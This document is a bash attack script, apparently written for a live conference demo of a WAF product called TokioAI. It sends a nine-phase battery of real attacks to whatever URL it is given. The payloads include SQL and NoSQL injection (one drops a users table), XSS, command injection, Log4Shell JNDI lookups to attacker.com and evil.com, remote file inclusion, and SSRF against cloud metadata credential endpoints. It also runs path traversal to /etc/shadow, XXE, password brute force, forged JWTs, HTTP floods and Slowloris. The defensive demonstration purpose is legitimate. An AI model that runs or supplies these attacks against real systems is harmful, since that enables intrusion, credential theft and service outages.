#!/bin/bash
# ============================================================================
# TokioAI Live Attack Demo — Ekoparty Miami 2026
# ============================================================================
#
# This script launches real attacks against the TokioAI WAF to demonstrate
# live detection and autonomous defense.
#
# USAGE:
#   ./attack_demo.sh <TARGET_URL> [--phase N] [--fast] [--all]
#
# EXAMPLES:
#   ./attack_demo.sh https://your-domain.com          # Interactive (phase by phase)
#   ./attack_demo.sh https://your-domain.com --all     # Run all phases
#   ./attack_demo.sh https://your-domain.com --phase 3 # Start from phase 3
#   ./attack_demo.sh https://your-domain.com --fast     # No pauses between attacks
#
# REQUIREMENTS:
#   apt install -y sqlmap nikto nmap gobuster ffuf hydra wrk curl nuclei
#   pip install xsstrike
#
# WARNING: Only run this against YOUR OWN infrastructure.
#          Never use against targets you don't own.
# ============================================================================

set -euo pipefail

# ── Colors and formatting ────────────────────────────────────────────────────
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
PURPLE='\033[0;35m'
WHITE='\033[1;37m'
NC='\033[0m'

BOLD='\033[1m'
DIM='\033[2m'

# ── Parse arguments ──────────────────────────────────────────────────────────
TARGET="${1:-}"
START_PHASE=1
FAST=false
RUN_ALL=false

shift || true
while [[ $# -gt 0 ]]; do
    case $1 in
        --phase) START_PHASE="$2"; shift 2 ;;
        --fast)  FAST=true; shift ;;
        --all)   RUN_ALL=true; shift ;;
        *)       echo "Unknown option: $1"; exit 1 ;;
    esac
done

if [[ -z "$TARGET" ]]; then
    echo -e "${RED}Usage: $0 <TARGET_URL> [--phase N] [--fast] [--all]${NC}"
    echo -e "${DIM}Example: $0 https://your-domain.com${NC}"
    exit 1
fi

# Strip trailing slash
TARGET="${TARGET%/}"

# ── Helpers ──────────────────────────────────────────────────────────────────
banner() {
    echo ""
    echo -e "${PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo -e "${WHITE}${BOLD}  $1${NC}"
    echo -e "${PURPLE}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
    echo ""
}

phase_header() {
    local num=$1
    local title=$2
    local desc=$3
    echo ""
    echo -e "${RED}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${RED}║  ${WHITE}${BOLD}PHASE $num: $title${NC}${RED}$(printf '%*s' $((46 - ${#num} - ${#title})) '')║${NC}"
    echo -e "${RED}║  ${DIM}$desc${NC}${RED}$(printf '%*s' $((56 - ${#desc})) '')║${NC}"
    echo -e "${RED}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

attack_log() {
    echo -e "  ${RED}[ATTACK]${NC} ${YELLOW}$1${NC}"
}

wait_phase() {
    if [[ "$FAST" == "false" && "$RUN_ALL" == "false" ]]; then
        echo ""
        echo -e "${CYAN}  Press ENTER to launch next phase (Ctrl+C to stop)...${NC}"
        read -r
    elif [[ "$FAST" == "false" ]]; then
        sleep 3
    fi
}

run_attack() {
    local desc="$1"
    shift
    attack_log "$desc"
    echo -e "  ${DIM}\$ $*${NC}"
    eval "$@" 2>&1 | head -30 || true
    echo ""
    sleep 1
}

# ── Preflight check ─────────────────────────────────────────────────────────
banner "TokioAI Live Attack Demo"
echo -e "  ${WHITE}Target:${NC}  $TARGET"
echo -e "  ${WHITE}Mode:${NC}    $(if $FAST; then echo 'Fast (no pauses)'; elif $RUN_ALL; then echo 'All phases (3s between)'; else echo 'Interactive (press Enter between phases)'; fi)"
echo -e "  ${WHITE}Start:${NC}   Phase $START_PHASE"
echo ""
echo -e "  ${YELLOW}Make sure SOC Terminal v2 is running on the big screen!${NC}"
echo -e "  ${DIM}python3 tokio_soc_v2.py --autonomous${NC}"
echo ""

if [[ "$RUN_ALL" == "false" && "$FAST" == "false" ]]; then
    echo -e "${CYAN}  Press ENTER to start the attack sequence...${NC}"
    read -r
fi

# ============================================================================
# PHASE 1: Reconnaissance
# ============================================================================
if [[ $START_PHASE -le 1 ]]; then
phase_header "1" "RECONNAISSANCE" "Scanning target for information gathering"

run_attack "HTTP Headers fingerprinting" \
    "curl -sI '$TARGET' | head -20"

run_attack "Technology detection (common paths)" \
    "curl -so /dev/null -w '%{http_code}' '$TARGET/wp-admin/' && echo ''; \
     curl -so /dev/null -w '%{http_code}' '$TARGET/.env' && echo ''; \
     curl -so /dev/null -w '%{http_code}' '$TARGET/robots.txt' && echo ''; \
     curl -so /dev/null -w '%{http_code}' '$TARGET/.git/config' && echo ''; \
     curl -so /dev/null -w '%{http_code}' '$TARGET/server-status' && echo ''"

run_attack "Aggressive crawling (50 common paths)" \
    "for path in admin login api backup config database db dump \
     .env .git/HEAD .svn/entries wp-config.php phpinfo.php \
     server-status server-info actuator/health swagger.json \
     api/v1 graphql console debug trace test dev staging \
     phpmyadmin adminer manager admin.php panel dashboard \
     cgi-bin .htaccess .htpasswd sitemap.xml crossdomain.xml \
     api/docs api/swagger /etc/passwd /.aws/credentials \
     /proc/self/environ shell cmd exec run eval; do \
         code=\$(curl -so /dev/null -w '%{http_code}' --max-time 3 '$TARGET/'\$path 2>/dev/null); \
         echo \"  /\$path -> \$code\"; \
     done"

wait_phase
fi

# ============================================================================
# PHASE 2: SQL Injection
# ============================================================================
if [[ $START_PHASE -le 2 ]]; then
phase_header "2" "SQL INJECTION" "Classic and advanced SQLi payloads"

run_attack "Basic SQLi probes" \
    "curl -s '$TARGET/api?id=1%27%20OR%201=1--' | head -5; \
     curl -s '$TARGET/api?id=1%27%20UNION%20SELECT%20NULL,NULL,NULL--' | head -5; \
     curl -s '$TARGET/login' -d 'user=admin%27--&pass=x' | head -5"

run_attack "Error-based SQLi" \
    "curl -s '$TARGET/api?id=1%27%20AND%20EXTRACTVALUE(1,CONCAT(0x7e,(SELECT%20version()),0x7e))--' | head -5; \
     curl -s '$TARGET/api?id=1%27%20AND%20(SELECT%201%20FROM(SELECT%20COUNT(*),CONCAT((SELECT%20user()),FLOOR(RAND(0)*2))x%20FROM%20information_schema.tables%20GROUP%20BY%20x)a)--' | head -5"

run_attack "Time-based blind SQLi" \
    "curl -s --max-time 5 '$TARGET/api?id=1%27%20AND%20SLEEP(3)--' | head -5; \
     curl -s --max-time 5 '$TARGET/api?id=1%27%20AND%20BENCHMARK(5000000,SHA1(%27test%27))--' | head -5"

run_attack "Second-order SQLi / stacked queries" \
    "curl -s '$TARGET/api' -d '{\"name\": \"admin\\'; DROP TABLE users;--\"}' -H 'Content-Type: application/json' | head -5; \
     curl -s '$TARGET/api?id=1;WAITFOR%20DELAY%20%270:0:3%27--' | head -5"

run_attack "NoSQL Injection" \
    "curl -s '$TARGET/api/login' -d '{\"user\": {\"\$gt\": \"\"}, \"pass\": {\"\$gt\": \"\"}}' -H 'Content-Type: application/json' | head -5; \
     curl -s '$TARGET/api/users?filter[\$where]=this.password.match(/.*/)' | head -5"

if command -v sqlmap &>/dev/null; then
    run_attack "sqlmap automated scan (30s max)" \
        "timeout 30 sqlmap -u '$TARGET/api?id=1' --batch --level=3 --risk=2 --threads=4 2>&1 | tail -20"
fi

wait_phase
fi

# ============================================================================
# PHASE 3: XSS (Cross-Site Scripting)
# ============================================================================
if [[ $START_PHASE -le 3 ]]; then
phase_header "3" "CROSS-SITE SCRIPTING" "Reflected, stored, and DOM XSS payloads"

run_attack "Classic XSS payloads" \
    "curl -s '$TARGET/search?q=%3Cscript%3Ealert(1)%3C/script%3E' | head -5; \
     curl -s '$TARGET/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E' | head -5; \
     curl -s '$TARGET/search?q=%3Csvg%20onload=alert(1)%3E' | head -5"

run_attack "XSS filter bypass attempts" \
    "curl -s '$TARGET/search?q=%3CsCrIpT%3Ealert(1)%3C/ScRiPt%3E' | head -5; \
     curl -s '$TARGET/search?q=%3Cscript%3Ealert(String.fromCharCode(88,83,83))%3C/script%3E' | head -5; \
     curl -s '$TARGET/search?q=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E' | head -5; \
     curl -s '$TARGET/search?q=javascript:alert(1)//' | head -5"

run_attack "Encoded XSS" \
    "curl -s '$TARGET/search?q=%26%2360%3Bscript%26%2362%3Balert(1)%26%2360%3B/script%26%2362%3B' | head -5; \
     curl -s '$TARGET/search?q=%3Cscript%3Eeval(atob(%27YWxlcnQoMSk=%27))%3C/script%3E' | head -5; \
     curl -s -H 'Referer: <script>alert(1)</script>' '$TARGET/' | head -5"

run_attack "DOM-based XSS vectors" \
    "curl -s '$TARGET/#%3Cscript%3Ealert(1)%3C/script%3E' | head -5; \
     curl -s '$TARGET/?redirect=javascript:alert(1)' | head -5; \
     curl -s '$TARGET/?callback=%3Cscript%3Ealert(1)%3C/script%3E' | head -5"

run_attack "XSS via headers" \
    "curl -s -H 'User-Agent: <script>alert(1)</script>' '$TARGET/' | head -5; \
     curl -s -H 'X-Forwarded-For: <script>alert(1)</script>' '$TARGET/' | head -5; \
     curl -s -H 'Cookie: session=<script>alert(1)</script>' '$TARGET/' | head -5"

wait_phase
fi

# ============================================================================
# PHASE 4: Command Injection
# ============================================================================
if [[ $START_PHASE -le 4 ]]; then
phase_header "4" "COMMAND INJECTION" "OS command injection and RCE attempts"

run_attack "Basic command injection" \
    "curl -s '$TARGET/api' -d '{\"host\": \"8.8.8.8; cat /etc/passwd\"}' -H 'Content-Type: application/json' | head -5; \
     curl -s '$TARGET/api' -d '{\"cmd\": \"127.0.0.1 && whoami\"}' -H 'Content-Type: application/json' | head -5; \
     curl -s '$TARGET/ping?host=8.8.8.8%7Cid' | head -5"

run_attack "Blind command injection" \
    "curl -s '$TARGET/api' -d '{\"input\": \"test\`sleep 3\`\"}' -H 'Content-Type: application/json' | head -5; \
     curl -s '$TARGET/api' -d '{\"file\": \"test\$(curl attacker.com)\"}' -H 'Content-Type: application/json' | head -5"

run_attack "Log4Shell / JNDI injection" \
    "curl -s -H 'X-Api-Version: \${jndi:ldap://attacker.com/exploit}' '$TARGET/' | head -5; \
     curl -s -H 'User-Agent: \${jndi:rmi://attacker.com/obj}' '$TARGET/' | head -5; \
     curl -s '$TARGET/api' -d '{\"user\": \"\${jndi:ldap://evil.com/a}\"}' -H 'Content-Type: application/json' | head -5"

run_attack "Template injection (SSTI)" \
    "curl -s '$TARGET/api?name={{7*7}}' | head -5; \
     curl -s '$TARGET/api?name={{config.items()}}' | head -5; \
     curl -s '$TARGET/api?name=\${7*7}' | head -5; \
     curl -s '$TARGET/api?input=#{7*7}' | head -5"

wait_phase
fi

# ============================================================================
# PHASE 5: Path Traversal & File Inclusion
# ============================================================================
if [[ $START_PHASE -le 5 ]]; then
phase_header "5" "PATH TRAVERSAL" "Directory traversal and file inclusion"

run_attack "Classic path traversal" \
    "curl -s '$TARGET/file?path=../../../../etc/passwd' | head -5; \
     curl -s '$TARGET/file?path=....//....//....//etc/shadow' | head -5; \
     curl -s '$TARGET/download?file=../../../etc/hosts' | head -5"

run_attack "Encoded traversal" \
    "curl -s '$TARGET/file?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd' | head -5; \
     curl -s '$TARGET/file?path=..%252f..%252f..%252fetc%252fpasswd' | head -5; \
     curl -s '$TARGET/file?path=..%c0%af..%c0%af..%c0%afetc/passwd' | head -5"

run_attack "Windows path traversal" \
    "curl -s '$TARGET/file?path=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts' | head -5; \
     curl -s '$TARGET/file?path=....\\\\....\\\\boot.ini' | head -5"

run_attack "Remote/Local File Inclusion" \
    "curl -s '$TARGET/page?file=http://evil.com/shell.txt' | head -5; \
     curl -s '$TARGET/page?include=php://filter/convert.base64-encode/resource=index' | head -5; \
     curl -s '$TARGET/page?template=data://text/plain,<?php%20phpinfo();?>' | head -5"

wait_phase
fi

# ============================================================================
# PHASE 6: SSRF & XXE
# ============================================================================
if [[ $START_PHASE -le 6 ]]; then
phase_header "6" "SSRF & XXE" "Server-side request forgery and XML attacks"

run_attack "SSRF — Cloud metadata" \
    "curl -s '$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/' | head -5; \
     curl -s '$TARGET/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' | head -5; \
     curl -s '$TARGET/proxy?url=http://metadata.google.internal/computeMetadata/v1/' | head -5"

run_attack "SSRF — Internal network" \
    "curl -s '$TARGET/fetch?url=http://127.0.0.1:8080/' | head -5; \
     curl -s '$TARGET/fetch?url=http://localhost:5432/' | head -5; \
     curl -s '$TARGET/fetch?url=http://10.0.0.1/' | head -5; \
     curl -s '$TARGET/webhook?callback=http://internal-service:3000/admin' | head -5"

run_attack "XXE — XML External Entity" \
    "curl -s -X POST '$TARGET/api' -H 'Content-Type: application/xml' \
     -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>' | head -5; \
     curl -s -X POST '$TARGET/api' -H 'Content-Type: application/xml' \
     -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/\">]><foo>&xxe;</foo>' | head -5"

wait_phase
fi

# ============================================================================
# PHASE 7: Authentication Attacks
# ============================================================================
if [[ $START_PHASE -le 7 ]]; then
phase_header "7" "AUTH ATTACKS" "Brute force and credential stuffing"

run_attack "Login brute force (common passwords)" \
    "for pass in admin password 123456 admin123 letmein welcome \
     qwerty abc123 monkey master dragon login passw0rd \
     iloveyou trustno1 sunshine princess football shadow; do \
         code=\$(curl -so /dev/null -w '%{http_code}' --max-time 3 \
             '$TARGET/login' -d \"user=admin&password=\$pass\" 2>/dev/null); \
         echo \"  admin:\$pass -> HTTP \$code\"; \
     done"

run_attack "JWT manipulation" \
    "curl -s -H 'Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJhZG1pbiI6dHJ1ZX0.' '$TARGET/api/admin' | head -5; \
     curl -s -H 'Authorization: Bearer invalid.token.here' '$TARGET/api/admin' | head -5"

run_attack "Session fixation / cookie tampering" \
    "curl -s -b 'session=admin; role=superuser; is_admin=true' '$TARGET/admin' | head -5; \
     curl -s -b 'PHPSESSID=../../../../tmp/sess_attacker' '$TARGET/' | head -5"

wait_phase
fi

# ============================================================================
# PHASE 8: Rate Limiting / DDoS
# ============================================================================
if [[ $START_PHASE -le 8 ]]; then
phase_header "8" "RATE LIMITING / DDoS" "HTTP flood and connection exhaustion"

run_attack "Rapid-fire requests (100 in 5s)" \
    "for i in \$(seq 1 100); do \
         curl -so /dev/null -w 'Request \$i: HTTP %{http_code}\n' --max-time 2 '$TARGET/' 2>/dev/null & \
         [[ \$((i % 20)) -eq 0 ]] && wait; \
     done; wait"

run_attack "Slowloris-style (many slow connections)" \
    "for i in \$(seq 1 30); do \
         (curl -s --max-time 10 -H 'X-Slowloris: yes' \
              -H 'Connection: keep-alive' \
              --limit-rate 10 '$TARGET/' > /dev/null 2>&1 &); \
     done; sleep 5; echo 'Slow connections sent'"

if command -v wrk &>/dev/null; then
    run_attack "wrk HTTP flood (10 seconds)" \
        "wrk -t2 -c50 -d10s '$TARGET/' 2>&1 | tail -10"
fi

run_attack "Large payload flood" \
    "PAYLOAD=\$(python3 -c 'print(\"A\"*100000)' 2>/dev/null || printf 'A%.0s' {1..10000}); \
     for i in \$(seq 1 10); do \
         curl -so /dev/null -w 'Payload \$i: HTTP %{http_code}\n' --max-time 5 \
             '$TARGET/api' -d \"\$PAYLOAD\" -H 'Content-Type: text/plain' 2>/dev/null & \
     done; wait"

wait_phase
fi

# ============================================================================
# PHASE 9: Scanner Simulation (Nikto/Nuclei style)
# ============================================================================
if [[ $START_PHASE -le 9 ]]; then
phase_header "9" "VULNERABILITY SCANNERS" "Simulating automated security scanners"

if command -v nikto &>/dev/null; then
    run_attack "Nikto scan (60s max)" \
        "timeout 60 nikto -h '$TARGET' -maxtime 50 2>&1 | tail -30"
fi

if command -v nuclei &>/dev/null; then
    run_attack "Nuclei critical/high CVE scan (60s max)" \
        "timeout 60 nuclei -u '$TARGET' -severity critical,high -silent 2>&1 | tail -20"
fi

run_attack "Manual CVE probes" \
    "curl -s -H 'X-Api-Version: \${jndi:ldap://x/}' '$TARGET/' | head -3; \
     curl -s '$TARGET/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd' | head -3; \
     curl -s '$TARGET/.well-known/security.txt' | head -3; \
     curl -s -X TRACE '$TARGET/' | head -3; \
     curl -s -X OPTIONS '$TARGET/' -I | head -10; \
     curl -s '$TARGET/actuator/env' | head -3; \
     curl -s '$TARGET/debug/vars' | head -3; \
     curl -s '$TARGET/elmah.axd' | head -3"

wait_phase
fi

# ============================================================================
# FINAL SUMMARY
# ============================================================================
banner "ATTACK SEQUENCE COMPLETE"

echo -e "  ${GREEN}All 9 phases executed against ${WHITE}$TARGET${NC}"
echo ""
echo -e "  ${YELLOW}Attacks launched:${NC}"
echo -e "    Phase 1: Reconnaissance & path discovery"
echo -e "    Phase 2: SQL Injection (classic, blind, NoSQL)"
echo -e "    Phase 3: Cross-Site Scripting (reflected, DOM, encoded)"
echo -e "    Phase 4: Command Injection & RCE (OS, Log4Shell, SSTI)"
echo -e "    Phase 5: Path Traversal & File Inclusion"
echo -e "    Phase 6: SSRF & XXE"
echo -e "    Phase 7: Authentication Attacks (brute force, JWT)"
echo -e "    Phase 8: Rate Limiting / DDoS flood"
echo -e "    Phase 9: Vulnerability Scanners (Nikto, Nuclei, CVEs)"
echo ""
echo -e "  ${GREEN}Check SOC Terminal to see how TokioAI defended against each attack!${NC}"
echo ""
